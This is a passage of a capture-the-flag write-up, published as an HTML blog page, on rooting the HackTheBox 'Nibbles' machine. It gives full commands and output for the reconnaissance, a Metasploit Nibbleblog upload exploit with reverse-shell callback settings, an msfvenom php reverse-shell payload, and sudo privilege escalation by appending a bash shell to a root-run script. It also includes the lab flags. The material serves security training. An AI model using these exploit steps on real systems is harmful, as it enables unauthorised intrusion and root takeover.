@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+  <meta charset="utf-8">
+  <title>Nibbles HackTheBox - Write-Up</title>
+
+  <!-- mobile responsive meta -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Rooting the Nibbles box from HackTheBox">
+  <meta name="author" content="See the description ...">
+  <meta name="generator" content="Hugo 0.71.0" />
+
+  <!-- plugins -->
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/bootstrap/bootstrap.min.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/Ionicons/css/ionicons.min.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/magnific-popup/magnific-popup.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/slick/slick.css">
+  
+
+  <!-- Main Stylesheet -->
+  
+  <link rel="stylesheet" href="http://192.168.1.191/scss/style.min.css" media="screen">
+
+  <!--Favicon-->
+  <link rel="shortcut icon" href="http://192.168.1.191/images/favicon.png" type="image/x-icon">
+  <link rel="icon" href="http://192.168.1.191/images/favicon.png" type="image/x-icon">
+
+</head><body>
+<!-- preloader start -->
+<div class="preloader">
+  
+</div>
+<!-- preloader end -->
+
+<header class="navigation">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        
+        <nav class="navbar">
+          
+          <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navigation">
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">
+              <img src="http://192.168.1.191/images/home.jpeg" alt="Chapl1n" class="img-responsive">
+            </a>
+          </div>
+          
+          <div class="collapse navbar-collapse" id="navigation">
+            <ul class="nav navbar-nav navbar-right">
+              <li><a href="http://192.168.1.191">Home</a></li>
+
+              
+              
+              <li><a href="http://192.168.1.191/about">About</a></li>
+              
+              
+              
+              <li><a href="http://192.168.1.191/project">Projects</a></li>
+              
+              
+              
+              <li><a href="http://192.168.1.191/blog">Blog</a></li>
+              
+              
+              
+              <li><a href="https://twitter.com/MrChapl1n">Twitter</a></li>
+              
+              
+
+              
+
+            </ul>
+          </div>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+<section class="page-title bg-2" style="background-image: url('http://192.168.1.191/images/featue-bg.jpg');">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        <div class="block">
+          <h1>Nibbles HackTheBox - Write-Up</h1>
+          <p>Rooting the Nibbles box from HackTheBox</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="page-wrapper">
+	<div class="container">
+		<div class="row">
+			<div class="col-md-8">
+				<div class="post post-single">
+					<h2 class="post-title">Nibbles HackTheBox - Write-Up</h2>
+					<div class="post-meta">
+						<ul>
+              <li><i class="ion-calendar"></i> September 4, 2020</li>
+              <li><i class="ion-android-people"></i>
+                Posted By
+                
+                <a class="text-primary" href="/author/"></a>
+                
+              </li>
+              <li><i class="ion-pricetags"></i> 
+                
+                <a href="/tags/hackthebox">Hack the box</a>
+								
+                , <a href="/tags/linux">Linux</a>
+								
+                , <a href="/tags/http">Http</a>
+								
+                , <a href="/tags/spidering">Spidering</a>
+								
+                , <a href="/tags/tty">Tty</a>
+								
+                , <a href="/tags/privesc">Privesc</a>
+								
+              </li>
+            </ul>
+					</div>
+					<div class="post-thumb">
+						<img class="img-responsive" src="/images/blog/nibbles/nibbles_image.jpg" alt="Nibbles HackTheBox - Write-Up">
+					</div>
+					<div class="post-content post-excerpt">
+						<p>This writeup will demonstrate my approach for pwning/rooting the HackTheBox machine called Nibbles to obtain the user &amp; root
+flags. It is is considered to be an easy machine and suitable for beginners.</p>
+<h1 id="section-1---with-metasploit"><strong>Section 1 - With Metasploit</strong></h1>
+<h1 id="reconnaissance"><strong>Reconnaissance</strong></h1>
+<h3 id="step-1---initial-nmap-scan">Step 1 - Initial nmap scan</h3>
+<p>To start, nmap is used to scan for open TCP ports and identify the services running on Nibbles. For
+a description of the specific switches used, take a look at my first article <a href="/blog/legacy/"><strong>Legacy</strong></a>.</p>
+<pre><code>student@teacher:~/hackthebox/Nibbles$ nmap -T4 -Pn -n --min-rate=1000 --max-rate=5000 -p- --open 10.10.10.75
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 15:10 BST
+Nmap scan report for 10.10.10.75
+Host is up (0.044s latency).
+Not shown: 65492 closed ports, 41 filtered ports
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 13.65 seconds
+</code></pre><p>The scan shows that TCP ports <code>22</code> (SSH) and <code>80</code> (HTTP) are open on Nibbles. I suspect that the system will be pwned via the HTTP server rather than SSH one since SSH exploitation is uncommon.</p>
+<h3 id="step-2---agressive-nmap-scan">Step 2 - Agressive nmap scan</h3>
+<p>I will now do an aggressive scan on these two TCP ports running on Nibbles to get a better understanding of the services running.</p>
+<pre><code>student@teacher:~/hackthebox/Nibbles$ nmap -T4 -Pn -n -p 22,80 -A -oA tcp_Aggressive_Nibbles 10.10.10.75
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-18 15:13 BST
+Nmap scan report for 10.10.10.75
+Host is up (0.025s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
+|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
+|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 11.20 seconds
+</code></pre><p>The scan shows me the version number for the SSH server (<code>OpenSSH 7.2p2</code>) and HTTP server (<code>Apache httpd 2.4.18</code>). I did also get several host keys for the SSH server, potentially something I can take advantage for man-in-the-middle (MITM) attacks.</p>
+<h1 id="enumeration"><strong>Enumeration</strong></h1>
+<h3 id="step-1---access-http-server">Step 1 - Access HTTP server</h3>
+<p>I will target the HTTP server first since there is a stronger chance of pwning Nibbles via this.</p>
+<p><img src="/images/blog/nibbles/snippet_3.png" width="100%" alt="HackTheBox Writeup by Chapl1n - HTTP Server - Nibbles" /></p>
+<p>Once the IP address resolves, I am met with a blank web page with the phrase &ldquo;Hello world!&quot;, not a lot to work with.</p>
+<h3 id="step-2---view-page-source">Step 2 - View page source</h3>
+<p>Checking the HTML source of the page should hopefully provide me more information to work with.</p>
+<p><img src="/images/blog/nibbles/snippet_4.png" width="100%" alt="HackTheBox Writeup by Chapl1n - HTTP Server - Page Source - Nibbles" /></p>
+<p>The page source indicates a directory called <code>nibbleblog</code>.</p>
+<h3 id="step-3---view-nibbleblog-directory">Step 3 - View nibbleblog directory</h3>
+<p><img src="/images/blog/nibbles/snippet_5.png" width="100%" alt="HackTheBox Writeup by Chapl1n - HTTP Server - Nibbleblog - Nibbles" /></p>
+<p>The new URL path resolves to what appears to be a simplistic blog site called <code>Nibbles</code>. At the bottom right of the page I see that blog is powered using a framework called <code>Nibbleblog</code>. I will research for any potential exploits and vulnerabilities related to it.</p>
+<h3 id="step-4---searchsploit-nibbleblog">Step 4 - Searchsploit nibbleblog</h3>
+<p>I will use the <code>searchsploit</code> tool to identify any exploits related to nibbleblog.</p>
+<pre><code>student@teacher:~/hackthebox/Nibbles$ searchsploit Nibbleblog
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                              |  Path
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Nibbleblog 3 - Multiple SQL Injections                                                                                      | php/webapps/35865.txt
+Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                       | php/remote/38489.rb
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre><p>Thankfully I can see there is metasploit module for nibbleblog version <code>4.0.3</code> that can be abused to upload files. If possible, I should be able to upload a reverse shell payload and access Nibble&rsquo;s file system.</p>
+<h3 id="step-5---dirbuster-scan">Step 5 - DirBuster scan</h3>
+<p>Before I consider doing this, I am interested in getting a better understanding of the HTTP server infrastructure. I will use the spidering/crawling tool <code>DirBuster</code> to show me all the files and folders that make up the server.</p>
+<p><img src="/images/blog/nibbles/snippet_7.png" width="100%" alt="HackTheBox Writeup by Chapl1n - HTTP Server - DirBuster Scan - Nibbles" /></p>
+<p>I specify the IP address of Nibbles and the port through which the HTTP server runs on. I am using the small DirBuster list as I do not have any reason to use the larger ones yet. Normally when using DirBuster, I would begin at the base (<code>/</code>) of the file system, but in this case I specify to start to start spidering at the <code>nibbleblog</code> directory.</p>
+<p><img src="/images/blog/nibbles/snippet_8.png" width="100%" alt="HackTheBox Writeup by Chapl1n - HTTP Server - DirBuster Scan - Nibbles" /></p>
+<p>Immediately when I run the scan I notice something wrong, the scan takes an estimated 1.5 hours to finish. For a first scan with no prior evidence, this is too long, I need to improve the scan to reduce this time.</p>
+<h3 id="step-51-improved-dirbuster-scan">Step 5.1 Improved DirBuster scan</h3>
+<p><img src="/images/blog/nibbles/snippet_9.png" width="100%" alt="HackTheBox Writeup by Chapl1n - HTTP Server - DirBuster Scan - Nibbles" /></p>
+<p>3 minutes is a lot better than 1.5 hours. The problem was that the scan was still trying to scan from the base of the file system and it was being recursive. I specified not to do any recursive spidering and to start from the nibbleblog directory.</p>
+<h3 id="step-52---review-dirbuster-scan">Step 5.2 - Review DirBuster Scan</h3>
+<p><img src="/images/blog/nibbles/snippet_10.png" width="100%" alt="HackTheBox Writeup by Chapl1n - HTTP Server - DirBuster Scan Results - Nibbles" /></p>
+<p>A lot has come back from this scan and it has got me thinking, if this is a blog site, then surely there should be an area for an administrator to log into from. The results show a file called <code>admin.php</code> that interests me.</p>
+<p><img src="/images/blog/nibbles/snippet_11.png" width="100%" alt="HackTheBox Writeup by Chapl1n - HTTP Server - Nibbleblog - Admin - Login - Nibbles" /></p>
+<p>When the URL path resolves, I can see an admin login page. If I can get admin credentials for the blog site, I could then upload a reverse shell and access Nibble&rsquo;s file system.</p>
+<p>I am going to presume that a valid &ldquo;username&rdquo; is <code>admin</code> since this is the admin login page. After a bit of time trying different combinations for the password, a friend said that the answer is &ldquo;sitting right infront of you&rdquo;. Eventually I tried <code>nibbles</code> as the password.</p>
+<p><img src="/images/blog/nibbles/snippet_12.png" width="100%" alt="HackTheBox Writeup by Chapl1n - HTTP Server - Nibbleblog - Admin - Nibbles" /></p>
+<p><code>nibbles</code> is a valid password with the username <code>admin</code>, I now have adminisitrator access to the Nibbleblog site. I will now attempt o use the metasploit module I discovered using searchsploit.</p>
+<h1 id="exploitation"><strong>Exploitation</strong></h1>
+<h3 id="step-1---find-and-load-metasploit-module">Step 1 - Find and load metasploit module</h3>
+<p>I start by loading up metasploit (<code>msfconsole</code>) and search for the nibbleblog exploit module.</p>
+<pre><code>msf5 &gt; search nibbleblog
+
+Matching Modules
+================
+
+   #  Name                                       Disclosure Date  Rank       Check  Description
+   -  ----                                       ---------------  ----       -----  -----------
+   0  exploit/multi/http/nibbleblog_file_upload  2015-09-01       excellent  Yes    Nibbleblog File Upload Vulnerability
+</code></pre><p>I see the module I want and load it.</p>
+<pre><code>msf5 &gt; use 0
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf5 exploit(multi/http/nibbleblog_file_upload) &gt;
+</code></pre><h3 id="step-2---configure-module-and-payload">Step 2 - Configure module and payload</h3>
+<p>The module and payload must now be configured to target Nibbles and so that my attacking box receives the reverse shell connection.</p>
+<pre><code>msf5 exploit(multi/http/nibbleblog_file_upload) &gt; options
+
+Module options (exploit/multi/http/nibbleblog_file_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       The password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the web application
+   USERNAME                    yes       The username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.192    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Nibbleblog 4.0.3
+</code></pre><p><strong>Note:</strong> This module only works if the version of Nibbleblog is 4.0.3, which this is. I forgot during my writeup for Nibbles to add a screenshot from the settings page to show this.</p>
+<p>I start by setting the <code>PASSWORD</code> value to <code>nibbles</code>.</p>
+<pre><code>msf5 exploit(multi/http/nibbleblog_file_upload) &gt; set PASSWORD nibbles
+PASSWORD =&gt; nibbles
+</code></pre><p>The <code>RHOSTS</code> value now needs to be set to the IP address of Nibbles.</p>
+<pre><code>msf5 exploit(multi/http/nibbleblog_file_upload) &gt; set RHOSTS 10.10.10.75
+RHOSTS =&gt; 10.10.10.75
+</code></pre><p>I do not need to set the <code>RPORT</code> as it has been preset appropriately.
+The <code>TARGETURI</code> must be set to the URL path where the blog is held from - the nibbleblog directory.</p>
+<pre><code>msf5 exploit(multi/http/nibbleblog_file_upload) &gt; set TARGETURI /nibbleblog/
+TARGETURI =&gt; /nibbleblog/
+</code></pre><p>The <code>USERNAME</code> value needs to be set to <code>admin</code>.</p>
+<pre><code>msf5 exploit(multi/http/nibbleblog_file_upload) &gt; set USERNAME admin
+USERNAME =&gt; admin
+</code></pre><p>The <code>LHOST</code> value needs to be set to the IP address of my attacking box in order for the connection to be made.</p>
+<pre><code>msf5 exploit(multi/http/nibbleblog_file_upload) &gt; set LHOST 10.10.16.195
+LHOST =&gt; 10.10.16.195
+</code></pre><p>I will now check the module and payload configurations again to ensure everything is set correctly.</p>
+<pre><code>msf5 exploit(multi/http/nibbleblog_file_upload) &gt; options
+
+Module options (exploit/multi/http/nibbleblog_file_upload):
+
+   Name       Current Setting        Required  Description
+   ----       ---------------        --------  -----------
+   PASSWORD   nibbles                yes       The password to authenticate with
+   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     10.10.10.75            yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT      80                     yes       The target port (TCP)
+   SSL        false                  no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /nibbleblog/  yes       The base path to the web application
+   USERNAME   admin                  yes       The username to authenticate with
+   VHOST                             no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  10.10.16.195     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Nibbleblog 4.0.3
+</code></pre><p>Everything looks good and I can now execute the module.</p>
+<h3 id="step-3---execute-module">Step 3 - Execute module</h3>
+<pre><code>msf5 exploit(multi/http/nibbleblog_file_upload) &gt; run
+
+[*] Started reverse TCP handler on 10.10.16.195:4444 
+[*] Sending stage (38288 bytes) to 10.10.10.75
+[*] Meterpreter session 1 opened (10.10.16.195:4444 -&gt; 10.10.10.75:47418) at 2020-08-19 13:13:10 +0100
+[+] Deleted image.php
+
+meterpreter &gt;
+</code></pre><p>I now have a meterpreter session with Nibbles.</p>
+<h1 id="post-exploitation"><strong>Post Exploitation</strong></h1>
+<h3 id="step-1---create-tty-shell">Step 1 - Create tty shell</h3>
+<p>With this meterpreter session I want to establish a TTY shell session, this will allow me to access Nibble&rsquo;s file system.</p>
+<pre><code>meterpreter &gt; shell
+Process 18031 created.
+Channel 0 created.
+</code></pre><h3 id="step-2---create-bash-session">Step 2 - Create bash session</h3>
+<p>I only have a basic shell (sh) session and would prefer to have a full bash session.</p>
+<p>A good source of information for spawning TTY shells is the following:</p>
+<blockquote>
+<p><a href="https://netsec.ws/?p=337"><code>https://netsec.ws/?p=337</code></a></p>
+</blockquote>
+<p>I will now attempt to use python to establish the bash shell session.</p>
+<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'      
+/bin/sh: 1: python: not found
+</code></pre><p>Python was not found, I did not check to see if python is even installed on Nibbles. Python is normally listed within the /usr/bin folder.</p>
+<pre><code>ls /usr/bin | grep python
+dh_python3
+python3
+python3.5
+python3.5m
+python3m
+</code></pre><p>I am piping (<code>|</code>) the <code>ls</code> command with <code>grep</code> to only show me content that contains the phrase <code>python</code> in the /usr/bin folder. I see that python 3 is installed on Nibbles. I will now repeat the command to create the bash session knowing where python is installed on Nibbles.</p>
+<pre><code>/usr/bin/python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'  
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
+</code></pre><p>The bash session has been established and I have been placed in a folder called <code>my_images</code>.</p>
+<h3 id="step-2---check-privilege-level">Step 2 - Check privilege level</h3>
+<p>The first thing I do is check what my privilege level is using the <code>whoami</code> command.</p>
+<pre><code>nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ whoami
+&lt;ml/nibbleblog/content/private/plugins/my_image$ whoami                      
+nibbler
+</code></pre><p>I am user called <code>nibbler</code>, this could have been already noted through the command prompt that states my username. I am not root which could potentially mean I am required to do some form of privilege escalation (<code>privesc</code>) on Nibbles.</p>
+<h3 id="step-3---get-to-the-base-of-file-system">Step 3 - Get to the base of file system</h3>
+<p>I want to know where the user and root flags are held in Nibble&rsquo;s file system. I start my search by getting to the base (<code>/</code>) of the file system.</p>
+<pre><code>nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /
+&lt;ml/nibbleblog/content/private/plugins/my_image$ cd /                        
+nibbler@Nibbles:/$
+</code></pre><h3 id="step-4---find-root-flag">Step 4 - Find root flag</h3>
+<p>I can now focus on finding the user and root flags. I start by listing the contents of my current directory.</p>
+<pre><code>nibbler@Nibbles:/$ ls
+ls
+bin   home            lib64       opt   sbin  tmp      vmlinuz.old
+boot  initrd.img      lost+found  proc  snap  usr
+dev   initrd.img.old  media       root  srv   var
+etc   lib             mnt         run   sys   vmlinuz
+</code></pre><p>I see a folder called <code>root</code> that interests me.</p>
+<pre><code>nibbler@Nibbles:/$ cd root
+cd root
+bash: cd: root: Permission denied
+nibbler@Nibbles:/$
+</code></pre><p>I do not have the permissions required to access the folder and this means that I must perfrom privesc to pwn Nibbles.</p>
+<pre><code>nibbler@Nibbles:/$ ls -lah
+ls -lah
+total 101K
+drwxr-xr-x  23 root root 4.0K Dec 28  2017 .
+drwxr-xr-x  23 root root 4.0K Dec 28  2017 ..
+drwxr-xr-x   2 root root  12K Dec 28  2017 bin
+drwxr-xr-x   4 root root 1.0K Dec 28  2017 boot
+drwxr-xr-x  19 root root 3.9K Aug 20 08:36 dev
+drwxr-xr-x  92 root root 4.0K Dec 28  2017 etc
+drwxr-xr-x   3 root root 4.0K Dec 10  2017 home
+lrwxrwxrwx   1 root root   33 Dec 28  2017 initrd.img -&gt; boot/initrd.img-4.4.0-104-generic
+lrwxrwxrwx   1 root root   32 Dec 10  2017 initrd.img.old -&gt; boot/initrd.img-4.4.0-62-generic
+drwxr-xr-x  22 root root 4.0K Dec 28  2017 lib
+drwxr-xr-x   2 root root 4.0K Sep 22  2017 lib64
+drwx------   2 root root  16K Sep 22  2017 lost+found
+drwxr-xr-x   4 root root 4.0K Sep 22  2017 media
+drwxr-xr-x   2 root root 4.0K Dec 10  2017 mnt
+drwxr-xr-x   2 root root 4.0K Jul 19  2016 opt
+dr-xr-xr-x 129 root root    0 Aug 20 08:36 proc
+drwx------   4 root root 4.0K Dec 29  2017 root
+drwxr-xr-x  25 root root  860 Aug 20 08:37 run
+drwxr-xr-x   2 root root  12K Dec 28  2017 sbin
+drwxr-xr-x   2 root root 4.0K Jun 29  2016 snap
+drwxr-xr-x   2 root root 4.0K Jul 19  2016 srv
+dr-xr-xr-x  13 root root    0 Aug 20 08:53 sys
+drwxrwxrwt   9 root root 4.0K Aug 20 08:42 tmp
+drwxr-xr-x  10 root root 4.0K Sep 22  2017 usr
+drwxr-xr-x  14 root root 4.0K Dec 10  2017 var
+lrwxrwxrwx   1 root root   30 Dec 28  2017 vmlinuz -&gt; boot/vmlinuz-4.4.0-104-generic
+lrwxrwxrwx   1 root root   29 Dec 10  2017 vmlinuz.old -&gt; boot/vmlinuz-4.4.0-62-generic
+</code></pre><p>Using the <code>ls -lah</code> command shows me that I must be the root user to access the root folder.</p>
+<h3 id="step-5---find-user-flag">Step 5 - Find user flag</h3>
+<p>I know where the root flag is likely to be but I also need to know where the user flag is held. I&rsquo;ve recently learned to use the <code>locate</code> command as a quicker method of finding specific files.</p>
+<pre><code>nibbler@Nibbles:/$ locate user.txt
+locate user.txt
+/home/nibbler/user.txt
+</code></pre><p>I find the <code>user.txt</code> file and will now check its content&rsquo;s to see if it is the user flag for Nibbles.</p>
+<pre><code>nibbler@Nibbles:/$ cat /home/nibbler/user.txt
+cat /home/nibbler/user.txt
+b02ff32bb332deba49eeaed21152c8d8
+</code></pre><p>I now have the user flag for Nibbles and must now focus on getting the root flag via privesc.</p>
+<h1 id="privilege-escalation"><strong>Privilege Escalation</strong></h1>
+<p>Nibbles is a Linux based system and a good resource I have been using for Linux privesc is:</p>
+<blockquote>
+<p><a href="https://payatu.com/guide-linux-privilege-escalation"><code>https://payatu.com/guide-linux-privilege-escalation</code></a></p>
+</blockquote>
+<h3 id="step-1---sudo-capabilities">Step 1 - Sudo capabilities</h3>
+<p>The article talks about systems being exploited via users that have <code>sudo</code> (super-user-do-once) rights for certain files or commands. By exploiting this, I could potentially get my low prvileged shell to execute commands with root privileges. I will use the <code>sudo -l</code> command to list all files/commands that the user nibbler can run as root.</p>
+<pre><code>nibbler@Nibbles:/$ sudo -l
+sudo -l
+sudo: unable to resolve host Nibbles: Connection timed out
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+</code></pre><p>I see a file called <code>monitor.sh</code> which can be run with root privileges.</p>
+<h3 id="step-2---access-monitorsh">Step 2 - Access monitor.sh</h3>
+<pre><code>nibbler@Nibbles:/home/nibbler$ ls
+ls
+personal.zip  user.txt
+</code></pre><p>I list everything in the <code>nibbler</code> folder and find a zipped folder called <code>personal</code>, this is where the monitor.sh file is stored.</p>
+<pre><code>nibbler@Nibbles:/home/nibbler$ unzip personal.zip
+unzip personal.zip
+Archive:  personal.zip
+   creating: personal/
+   creating: personal/stuff/
+  inflating: personal/stuff/monitor.sh
+</code></pre><p>I unzip the folder and find the monitor.sh file I want. I list the <code>stuff</code> folder to inspect the shell file.</p>
+<pre><code>nibbler@Nibbles:/home/nibbler/personal/stuff$ ls
+ls
+monitor.sh
+</code></pre><p>I want to abuse this file so that results in me getting a root shell with Nibbles. I did a bit of research for exploiting sudo rights to do this and found several sources that helped me:</p>
+<blockquote>
+<ul>
+<li><a href="https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d"><code>https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d</code></a></li>
+<li><a href="https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist"><code>https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist</code></a></li>
+</ul>
+</blockquote>
+<p>These articles talk about appending a command to these folder and when the file is executed, the command will be executed with root privileges.</p>
+<pre><code>nibbler@Nibbles:/home/nibbler/personal/stuff$ echo &quot;/bin/bash -i&quot; &gt;&gt; monitor.sh
+&lt;er/personal/stuff$ echo &quot;/bin/bash -i&quot; &gt;&gt; monitor.sh
+</code></pre><p>This screenshot shows that I have appended the command <code>/bin/bash -i</code> command to the monitor.sh file. After monitor.sh is executed, I should get a new bash session but with root privileges.</p>
+<h3 id="step-4---execute-shell-script">Step 4 - Execute shell script</h3>
+<p>I now execute the script.</p>
+<pre><code>nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh          
+sudo ./monitor.sh
+sudo: unable to resolve host Nibbles: Connection timed out
+'unknown': I need something more specific.
+/home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found
+/home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found
+/home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found
+root@Nibbles:/home/nibbler/personal/stuff#
+</code></pre><h3 id="step-5---check-privilege-level">Step 5 - Check privilege level</h3>
+<p>I use the <code>whomai</code> command to check what user I am now.</p>
+<pre><code>root@Nibbles:/home/nibbler/personal/stuff# whoami
+whoami
+root
+</code></pre><p>I am now the root user. It should be noted that even without this command I know I am root because my hostname has changed from <code>nibbler</code> to <code>root</code>. The <code>#</code> at the end of the command prompt is an indication of me having root privileges.</p>
+<h3 id="step-6---get-root-flag">Step 6 - Get root flag</h3>
+<p>With root privileges, I can access the root folder and get the root flag.</p>
+<pre><code>root@Nibbles:~# ls
+ls
+root.txt
+</code></pre><p>I access the root.txt file.</p>
+<pre><code>root@Nibbles:~# cat root.txt
+cat root.txt
+b6d745c0dfb6457c55591efc898ef88c
+</code></pre><p>I submit this to HackTheBox and now have pwned Nibbles. I will attempt to pwn Nibbles again but without using metasploit.</p>
+<h1 id="section-2---without-metasploit"><strong>Section 2 - Without Metasploit</strong></h1>
+<p>I do not need to perform any reconnaissance or enumeration as I have already learned to exploit the Nibbleblog site by uploading a reverse shell payload to it.</p>
+<h1 id="exploitation-1"><strong>Exploitation</strong></h1>
+<h3 id="step-1---create-reverse-shell">Step 1 - Create reverse shell</h3>
+<p>Nibbleblog version 4.0.3 is vulnerable due to the ability of uploading php code to it. A good source that documented this is below:</p>
+<blockquote>
+<p><a href="https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/"><code>https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/</code></a></p>
+</blockquote>
+<p>I am using the tool <code>msfvenom</code> to create the reverse shell payload. Up to this point I have been using documentation from <a href="https://netsec.ws/?p=331"><code>netsec</code></a> for msfvenom payloads, however, it does not detail php payloads created without meterpreter. Meterpreter is a payload type that can only be used once during the OSCP exam and I therefore prefer not to use it unless necessary. I used the following source for the php reverse shell payload:</p>
+<blockquote>
+<p><a href="https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/"><code>https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/</code></a></p>
+</blockquote>
+<pre><code>student@teacher:~/hackthebox/Nibbles$ msfvenom -p php/reverse_php LHOST=10.10.16.195 LPORT=4444 -f raw &gt; php-reverse-shell.php
+[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
+[-] No arch selected, selecting arch: php from the payload
+No encoder specified, outputting raw payload
+Payload size: 3022 bytes
+</code></pre><p>The reverse shell has been created and can now be uploaded to the Nibbles blogsite.</p>
+<h3 id="step-2---upload-shell-to-blog">Step 2 - Upload shell to blog</h3>
+<p><img src="/images/blog/nibbles/snippet_45.png" width="100%" alt="HackTheBox Writeup by Chapl1n - Nibbleblog - Shell uploaded - Nibbles" /></p>
+<p>By going to the <code>Plugins</code> section of the blog and then <code>My image</code>, I am able to upload the shell. There is several warnings shown when the file is uploaded but these are to be ignored.</p>
+<h3 id="step-3---inspect-shell">Step 3 - Inspect shell</h3>
+<p><img src="/images/blog/nibbles/snippet_46.png" width="100%" alt="HackTheBox Writeup by Chapl1n - HTTP Server - DirBuster Scan - Nibbles" /></p>
+<p>I check from the browser that the shell has been uploaded. It becomes part of the image.php file and once I have my listener in place, I should be able to receive a reverse shell connection from Nibbles.</p>
+<h3 id="step-4---create-improved-reverse-shell-payload">Step 4 - Create improved reverse shell payload.</h3>
+<p><strong>Note:</strong> I did setup a listener and received the shell connection with Nibbles but the moment I attempted to do anything, the session would crash. I did some research for this found and found an alternative that provides me the php reverse shell. The following link is to the person&rsquo;s github repository:</p>
+<blockquote>
+<p><a href="https://github.com/pentestmonkey/php-reverse-shell"><code>https://github.com/pentestmonkey/php-reverse-shell</code></a></p>
+</blockquote>
+<p>I must now clone this repository.</p>
+<pre><code>student@teacher:~/hackthebox/Nibbles$ git clone https://github.com/pentestmonkey/php-reverse-shell.git
+Cloning into 'php-reverse-shell'...
+remote: Enumerating objects: 10, done.
+remote: Total 10 (delta 0), reused 0 (delta 0), pack-reused 10
+Unpacking objects: 100% (10/10), 9.79 KiB | 1.22 MiB/s, done.
+</code></pre><pre><code>student@teacher:~/hackthebox/Nibbles/php-reverse-shell$ ls
+CHANGELOG  COPYING.GPL  COPYING.PHP-REVERSE-SHELL  LICENSE  php-reverse-shell.php  README.md
